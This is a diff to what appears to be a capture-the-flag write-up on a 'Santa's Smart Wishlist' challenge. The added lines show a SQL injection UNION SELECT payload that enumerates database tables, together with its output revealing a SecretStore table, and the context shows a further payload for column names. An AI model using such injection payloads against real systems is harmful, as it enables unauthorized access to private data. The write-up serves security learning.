@@ -46,6 +46,16 @@ It worked well! Now was the time to look around.
 
 To send longer queries I had to split them in half and use both first and last name which then got concatenated.
 
+> **' UNION SELECT 'tbl', table_name FROM information_schema.tables WHERE table_schema = 'smartwishlist' #**  
+> /showwishes  
+>
+> **Santa's Smart Wishlist**  
+> tbl - SecretStore  
+> tbl - User  
+> tbl - Wish
+
+Ha! *SecretStore* table was exactly what I was looking for.
+
 > **' UNION SELECT 'col', column_name FROM information_schema.columns WHERE table_name = 'SecretStore' #**  
 > /showwishes  
 >
